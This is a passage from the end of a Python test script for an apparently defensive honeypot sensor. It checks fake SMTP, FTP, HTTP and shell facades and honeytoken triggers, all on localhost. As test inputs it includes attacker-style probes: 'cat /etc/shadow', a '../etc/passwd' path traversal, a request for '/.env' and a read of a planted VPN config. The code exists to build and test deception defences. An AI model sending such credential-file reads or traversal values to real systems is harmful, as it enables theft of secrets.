                break
            smtp_rest += chunk
    except socket.timeout:
        pass
    smtp.close()
    time.sleep(0.2)
    failures += not check("SMTP facade greets, accepts MAIL, refuses RCPT relay",
                          smtp_banner.startswith(b"220") and b"Relay access denied" in smtp_rest)

    ftp = socket.create_connection(("127.0.0.1", sport_ftp), timeout=5)
    ftp.settimeout(2)
    ftp_banner = ftp.recv(200)
    ftp.sendall(b"USER anonymous\r\nPASS guest\r\nQUIT\r\n")
    ftp_rest = b""
    try:
        while True:
            chunk = ftp.recv(500)
            if not chunk:
                break
            ftp_rest += chunk
    except socket.timeout:
        pass
    ftp.close()
    time.sleep(0.25)
    failures += not check("FTP facade greets and refuses login",
                          ftp_banner.startswith(b"220") and b"530" in ftp_rest)

    # Connect-and-leave still counts as a probe in status.json
    leave = socket.create_connection(("127.0.0.1", sport_smtp), timeout=5)
    leave.close()
    time.sleep(0.3)
    import json as _json
    status = _json.loads(open("/tmp/anglerfish-status.json").read())
    failures += not check("probe status file records connects",
                          status.get("probes_total", 0) >= 2)
    multi.stop()

    # --- New realism regressions ---
    # uname -m via FakeShell
    _usess = {"commands": [], "events": [], "read_files": [], "credentials": []}
    _uout, _, _ = sensor._run_fake("uname -m", "/home/deploy", _usess)
    failures += not check("uname -m returns x86_64", _uout.strip() == "x86_64")
    _uout2, _, _ = sensor._run_fake("cat /etc/shadow", "/home/deploy", _usess)
    failures += not check("/etc/shadow is Permission denied", "Permission denied" in _uout2)
    _uout3, _, _ = sensor._run_fake("nproc; echo hi", "/home/deploy", _usess)
    failures += not check("shell parser splits on ;", "2" in _uout3 and "hi" in _uout3)
    # share path isolation
    from anglerfish.sensor import _resolve_share_path
    failures += not check("share resolver refuses /etc and bare leaves outside shares",
                          _resolve_share_path("passwd", sensor.world["files"], sensor.world["shares"]) == ""
                          and _resolve_share_path("../etc/passwd", sensor.world["files"], sensor.world["shares"]) == ""
                          and _resolve_share_path("IT/it-handover.txt", sensor.world["files"], sensor.world["shares"]).endswith("it-handover.txt"))
    # real 404 for /.env
    env404 = http_exchange(hport, b"GET /.env HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    failures += not check("/.env returns nginx-style 404 with Date",
                          env404.startswith(b"HTTP/1.1 404") and b"Date:" in env404
                          and b"nginx" in env404)
    # HEAD has empty body
    head = http_exchange(hport, b"HEAD / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    failures += not check("HEAD / returns 200 with empty body",
                          head.startswith(b"HTTP/1.1 200")
                          and head.split(b"\r\n\r\n", 1)[-1] == b"")

    sensor.stop()


    # 4. Sensor to console, and a token trigger arriving.
    db = "/tmp/anglerfish-test-console.db"
    for suffix in ("", "-wal", "-shm"):
        if os.path.exists(db + suffix):
            os.remove(db + suffix)
    cport = free_port()
    con = console_module.Console(db)
    handler = type("B", (console_module.Handler,), {"console": con, "ui_path": None})
    httpd = ThreadingHTTPServer(("127.0.0.1", cport), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.3)
    url = "http://127.0.0.1:%d" % cport

    sport = free_port()
    sensor_module.SERVICE_BY_PORT[sport] = "telnet"
    reporting = make_sensor(name="reporting", console=url, ports=[sport],
                       log_path="/tmp/anglerfish-test2.log")
    reporting.start()
    time.sleep(0.4)
    try:
        console_dialog(sport, PLANTED_USER, "nope", PLANTED_PASS, [
            ("cat /home/deploy/office-vpn.ovpn", b"deploy@"),
        ])
    except Exception as exc:
        print("  reporting dialog raised: %s" % exc)
    time.sleep(0.5)

    failures += not check("the console received the session",
                          con.store.overview()["counts"]["sessions"] == 1)
    failures += not check("the console knows the planted tokens",
                          con.store.overview()["counts"]["tokens"] == len(reporting.tokens))

    import urllib.request
    token = reporting.tokens[0]
    urllib.request.urlopen(url + "/t/" + token["id"], timeout=5).read()
    time.sleep(0.3)
    failures += not check("a used token was recorded as a trigger",
                          con.store.overview()["counts"]["triggers"] == 1)

    reporting.stop()
    httpd.shutdown()
    con.store.close()

    print()
    if failures:
        print("%d check(s) failed." % failures)
        return 1
    print("All checks passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
